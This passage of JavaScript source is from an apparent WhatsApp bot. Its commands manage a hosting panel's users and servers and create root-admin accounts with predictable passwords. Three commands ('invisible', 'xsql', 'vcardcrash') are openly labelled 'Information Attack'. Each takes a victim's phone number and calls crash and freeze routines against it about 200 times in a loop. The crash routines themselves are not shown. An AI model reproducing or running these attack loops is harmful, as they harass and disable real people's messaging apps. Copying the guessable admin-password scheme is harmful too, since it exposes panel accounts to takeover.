        const res = await fetch(`${PANEL_DOMAIN}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + PANEL_API_KEY
            }
        });

        const data = await res.json();
        if (data.errors) {
            return reply("❌ " + JSON.stringify(data.errors[0]));
        }

        const users = data.data;
        const user = users.find(
            u =>
                u.attributes.username === usernameOrId ||
                String(u.attributes.id) === String(usernameOrId)
        );

        if (!user) {
            return xreply(`❌ User "${usernameOrId}" not found.`);
        }

        // Delete user
        const delRes = await fetch(
            `${PANEL_DOMAIN}/api/application/users/${user.attributes.id}`,
            {
                method: "DELETE",
                headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json",
                    Authorization: "Bearer " + PANEL_API_KEY
                }
            }
        );

        if (delRes.status === 204) {
            xreply(
                `✅ *Panel User Deleted Successfully*\n\n` +
                `👤 Username: ${user.attributes.username}\n` +
                `🆔 User ID: ${user.attributes.id}`
            );
        } else {
            const errData = await delRes.json();
            xreply("❌ Error: " + JSON.stringify(errData));
        }

    } catch (err) {
        xreply("❌ Error: " + err.message);
    }
}
break;

/////////ADD SERVER////////////////
case "addserver": {
    if (!isOwner) {
        return xreply("❌ You are not authorized to add servers.");
    }

    if (!q) {
        return xreply(
            "❌ Invalid format.\n\n" +
            "Usage:\n" +
            "addserver <serverName> <RAM> <username>\n" +
            "Example: addserver MyServer 1gb johndoe"
        );
    }

    const args = q.split(" ");
    const serverName = args[0];
    const ramType = args[1]?.toLowerCase();
    const username = args[2];

    if (!serverName || !ramType || !username) {
        return xreply(
            "❌ Invalid format.\n\n" +
            "Usage:\n" +
            "addserver <serverName> <RAM> <username>\n" +
            "Example: addserver MyServer 1gb johndoe"
        );
    }

    function getLimits(type) {
        if (type === "unli") return { memory: 0, cpu: 0, disk: 0 };
        const ram = parseInt(type.replace("gb", "")) * 1024; // GB → MB
        return { memory: ram, cpu: 50, disk: ram * 2 };
    }

    const limits = getLimits(ramType);

    try {
        // 1️⃣ Find panel user by username
        const usersRes = await fetch(`${PANEL_DOMAIN}/api/application/users`, {
            headers: {
                Accept: "application/json",
                Authorization: "Bearer " + PANEL_API_KEY
            }
        });
        const usersData = await usersRes.json();
        const user = usersData.data.find(u => u.attributes.username === username);

        if (!user) return xreply(`❌ User *${username}* not found.`);

        const userId = user.attributes.id;

        // 2️⃣ Get egg startup command
        const eggRes = await fetch(
            `${PANEL_DOMAIN}/api/application/nests/5/eggs/${GLOBAL_EGG}`,
            {
                headers: {
                    Accept: "application/json",
                    Authorization: "Bearer " + PANEL_API_KEY
                }
            }
        );
        const eggData = await eggRes.json();
        const startup_cmd = eggData.attributes.startup;

        // 3️⃣ Create server
        const serverRes = await fetch(`${PANEL_DOMAIN}/api/application/servers`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + PANEL_API_KEY
            },
            body: JSON.stringify({
                name: `${serverName} - ${ramType.toUpperCase()}`,
                description: "Added via WhatsApp Bot",
                user: userId,
                egg: parseInt(GLOBAL_EGG),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_24",
                startup: startup_cmd,
                environment: {
                    INST: "npm",
                    USER_UPLOAD: "0",
                    AUTO_UPDATE: "0",
                    CMD_RUN: "npm start"
                },
                limits: {
                    memory: limits.memory,
                    swap: 0,
                    disk: limits.disk,
                    io: 500,
                    cpu: limits.cpu
                },
                feature_limits: {
                    databases: 5,
                    backups: 5,
                    allocations: 5
                },
                deploy: {
                    locations: [parseInt(GLOBAL_LOCATION)],
                    dedicated_ip: false,
                    port_range: []
                }
            })
        });

        const serverData = await serverRes.json();
        if (serverData.errors) return xreply("❌ " + JSON.stringify(serverData.errors[0]));

        // ✅ Success reply with rules
        const messageText = `✅ *Server Created Successfully*\n\n` +
            `🖥️ Name: *${serverName}*\n` +
            `👤 User: *${username}*\n` +
            `💾 RAM: *${ramType.toUpperCase()}*\n\n` +
            `📌 *Rules:*\n` +
            `• Do not share your panel data\n` +
            `• Admin panel active for 30 days\n` +
            `• Change your password after login`;

        await trashcore.sendMessage(chatId, { text: messageText }, { quoted: m });

    } catch (err) {
        xreply("❌ Error: " + err.message);
    }
}
break;
/////////CREATE SERVER////////////////
case "createserver": {
    if (!isOwner) {
        return xreply("❌ You are not authorized to use this command.");
    }

    if (!args[0] || !args[1]) {
        return xreply(
            "❌ Invalid format\n\n" +
            "Use:\n" +
            ".createserver unli username\n" +
            ".createserver 1gb username"
        );
    }

    const type = args[0].toLowerCase();
    const username = args[1];

    if (!["unli", "1gb", "2gb", "3gb", "4gb", "5gb", "10gb"].includes(type)) {
        return reply("❌ Invalid server type. Example: unli, 1gb, 2gb");
    }

    const limits = getLimits(type);
    const email = `${username}@gmail.com`;
    const password = `${username}001`;

    try {
        // 1️⃣ Create user
        const userRes = await fetch(`${PANEL_DOMAIN}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + PANEL_API_KEY
            },
            body: JSON.stringify({
                email,
                username,
                first_name: username,
                last_name: username,
                language: "en",
                password
            })
        });

        const userData = await userRes.json();
        if (userData.errors) return reply("❌ " + userData.errors[0].detail);

        const user = userData.attributes;

        // 2️⃣ Get egg startup
        const eggRes = await fetch(
            `${PANEL_DOMAIN}/api/application/nests/5/eggs/${GLOBAL_EGG}`,
            {
                method: "GET",
                headers: {
                    Accept: "application/json",
                    Authorization: "Bearer " + PANEL_API_KEY
                }
            }
        );

        const eggData = await eggRes.json();
        const startup_cmd = eggData.attributes.startup;

        // 3️⃣ Create server
        const serverRes = await fetch(`${PANEL_DOMAIN}/api/application/servers`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + PANEL_API_KEY
            },
            body: JSON.stringify({
                name: `${username} - ${type.toUpperCase()}`,
                description: "Created with WhatsApp Bot",
                user: user.id,
                egg: parseInt(GLOBAL_EGG),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_24",
                startup: startup_cmd,
                environment: {
                    INST: "npm",
                    USER_UPLOAD: "0",
                    AUTO_UPDATE: "0",
                    CMD_RUN: "npm start"
                },
                limits: {
                    memory: limits.memory,
                    swap: 0,
                    disk: limits.disk,
                    io: 500,
                    cpu: limits.cpu
                },
                feature_limits: {
                    databases: 5,
                    backups: 5,
                    allocations: 5
                },
                deploy: {
                    locations: [parseInt(GLOBAL_LOCATION)],
                    dedicated_ip: false,
                    port_range: []
                }
            })
        });

        const serverData = await serverRes.json();
        if (serverData.errors) return reply("❌ " + serverData.errors[0].detail);

        // 4️⃣ Success message
        reply(
            `✅ *Server Created Successfully*\n\n` +
            `👤 Username: ${username}\n` +
            `🔐 Password: ${password}\n` +
            `💾 Plan: ${type.toUpperCase()}\n` +
            `🔗 Panel: ${PANEL_DOMAIN}\n\n` +
            `⚠ Please change password after login
 ⚠ Please don't share your panel data.
 ⚠ Server active for 30days.
 ⚠ Ddos prohibited`
        );

    } catch (err) {
        xreply("❌ Error: " + err.message);
    }
}
break;

////////Cadminpanel///////////////
case "cadminpanel": {
    if (!isOwner) {
        return xreply("❌ You are not authorized to create panel admins.");
    }

    if (!q) {
        return xreply(
            "❌ Invalid format.\n\n" +
            "Usage:\n" +
            "cadminpanel username,email"
        );
    }

    const [username, email] = q.split(",").map(v => v.trim());

    if (!username || !email) {
        return xreply(
            "❌ Invalid format.\n\n" +
            "Usage:\n" +
            "cadminpanel username,email"
        );
    }

    const password = username + "Admin001";

    try {
        const res = await fetch(`${PANEL_DOMAIN}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + PANEL_API_KEY
            },
            body: JSON.stringify({
                email,
                username,
                first_name: username,
                last_name: "Admin",
                language: "en",
                password,
                root_admin: true // ✅ PANEL ADMIN
            })
        });

        const data = await res.json();

        if (data.errors) {
            return reply("❌ Error:\n" + JSON.stringify(data.errors[0], null, 2));
        }

        const msg = `
✅ *Panel Admin Created Successfully*

👤 *Username:* ${username}
📧 *Email:* ${email}
🔐 *Password:* ${password}
⚡ *Role:* Administrator
🔗 *Panel:* ${PANEL_DOMAIN}

📌 *Rules:*
1️⃣ Don't share your panel data.
2️⃣ Admin panel active for 30 days.
3️⃣ Change password immediately after login.
`;

        await trashcore.sendMessage(
            chatId,
            { text: msg },
            { quoted: m }
        );

    } catch (err) {
        xreply("❌ Error: " + err.message);
    }
}
break;
/////////DEL SERVER////////////////
case "delserver": {
    if (!isOwner) return xreply("❌ You are not authorized.");

    if (!args[0]) {
        return xreply("❌ Usage:\n.delserver <serverID | serverName>");
    }

    const target = args.join(" ");

    try {
        const res = await fetch(`${PANEL_DOMAIN}/api/application/servers`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                Authorization: "Bearer " + PANEL_API_KEY
            }
        });

        const data = await res.json();
        if (!data.data) return xreply("❌ Failed to fetch servers.");

        const server = data.data.find(s =>
            s.attributes.id == target ||
            s.attributes.name.toLowerCase() === target.toLowerCase()
        );

        if (!server) {
            return reply(`❌ Server not found: ${target}`);
        }

        // 🚨 PROTECTION CHECK
        if (String(server.attributes.id) === String(BOT_SERVER_ID)) {
            return reply(
                "🚫 *PROTECTED SERVER*\n\n" +
                "This server is running the bot and cannot be deleted."
            );
        }

        // Confirm delete
        await fetch(
            `${PANEL_DOMAIN}/api/application/servers/${server.attributes.id}`,
            {
                method: "DELETE",
                headers: {
                    Accept: "application/json",
                    Authorization: "Bearer " + PANEL_API_KEY
                }
            }
        );

        xreply(
            `✅ *Server Deleted Successfully*\n\n` +
            `🖥️ Name: ${server.attributes.name}\n` +
            `🆔 ID: ${server.attributes.id}`
        );

    } catch (err) {
        xreply("❌ Error: " + err.message);
    }
}
break;
/////////OWNER DETECT////////////////
      case "owner":
        {
          if (isOwner) {
            await xreply("✅ You are the bot owner!");
          } else {
            await xreply("❌ Only the bot owner can use this command!");
          }
        }
        break;

/////////Fetch database////////////////
      case "listdatabase":
        {
          try {
            if (!database.length) return reply("⚠️ The database is empty.");
            let msg = `📋 Authorized Users Database:\n\n`;
            database.forEach((user, idx) => {
              msg += `${idx + 1}. ${user.number} (Added by: ${user.addedBy || "Unknown"})\n`;
            });
            return reply(msg);
          } catch (err) {
            console.error("❌ Error fetching database:", err);
            return reply("❌ Failed to fetch the database.");
          }
        }
        break;
     
 /////////Invisible Call////////////////   
case "invisible": {
if (!isOwner) return xreply(`*You must be a bot owner to run this command first!*`)
if (!q) return xreply(`*Format Invalid!*\nUse: invisible 254xxx`)
    
let client =
  m.mentionedJid?.[0] ||
  (m.quoted ? m.quoted.sender : null) ||
  q.replace(/[^0-9]/g, '');
let isTarget = client + "@s.whatsapp.net"
await trashcore.sendMessage(chatId, { react: { text: '🔍', key: m.key } });
  let process = `*Information Attack*
* Sender : ${m.pushName}
* Target : ${client}
* Status : Process.....
`
await trashcore.sendMessage(chatId, { react: { text: '🚫', key: m.key } }); 
xreply(process) 
for (let r = 0; r < 50; r++) {
await callCrash(isTarget);
await sleep(5000)
await callCrash(isTarget);
await callCrash(isTarget);
await sleep(5000)
await callCrash(isTarget);
}

let put = `*Information Attack*
* Sender : ${m.pushName}
* Target : ${client}
* Status : Success
`
await trashcore.sendMessage(chatId, { react: { text: '✅', key: m.key } }); 
xreply(put)
}
break  

case "xsql": {
if (!isOwner) return xreply(`*You must be a bot owner to run this command first!*`)
if (!q) return xreply(`*Format Invalid!*\nUse: xsql 254xxx`)
    
let client =
  m.mentionedJid?.[0] ||
  (m.quoted ? m.quoted.sender : null) ||
  q.replace(/[^0-9]/g, '');
let isTarget = client + "@s.whatsapp.net"
await trashcore.sendMessage(chatId, { react: { text: '🔍', key: m.key } });
  let process = `*Information Attack*
* Sender : ${m.pushName}
* Target : ${client}
* Status : Process.....
`
await trashcore.sendMessage(chatId, { react: { text: '🚫', key: m.key } }); 
xreply(process) 
for (let r = 0; r < 50; r++) {
await freezechat(isTarget);
await sleep(5000)
await freezechat(isTarget);
await freezechat(isTarget);
await sleep(5000)
await freezechat(isTarget);
}

let put = `*Information Attack*
* Sender : ${m.pushName}
* Target : ${client}
* Status : Success
`
await trashcore.sendMessage(chatId, { react: { text: '✅', key: m.key } }); 
xreply(put)
}
break  

case "vcardcrash": {
if (!isOwner) return xreply(`*You must be a bot owner to run this command first!*`)
if (!q) return xreply(`*Format Invalid!*\nUse: vcardcrash 254xxx`)
    
let client =
  m.mentionedJid?.[0] ||
  (m.quoted ? m.quoted.sender : null) ||
  q.replace(/[^0-9]/g, '');
let isTarget = client + "@s.whatsapp.net"
await trashcore.sendMessage(chatId, { react: { text: '🔍', key: m.key } });
  let process = `*Information Attack*
* Sender : ${m.pushName}
* Target : ${client}
* Status : Process.....
`
await trashcore.sendMessage(chatId, { react: { text: '🚫', key: m.key } }); 
xreply(process) 
for (let r = 0; r < 50; r++) {
await stickerPackCrash(isTarget);
await sleep(5000)
await stickerPackCrash(isTarget);
await stickerPackCrash(isTarget);
await sleep(5000)
await stickerPackCrash(isTarget);
}

let put = `*Information Attack*
* Sender : ${m.pushName}
* Target : ${client}
* Status : Success
`
await trashcore.sendMessage(chatId, { react: { text: '✅', key: m.key } }); 
xreply(put)
}
break  


      default:
        await xreply("❓ Unknown command");
        console.log(chalk.redBright("Unknown command:"), command);
        break;
    }

  } catch (err) {
    console.error(chalk.redBright("❌ Error in handleCommand:"), err?.stack || err);
  }
};
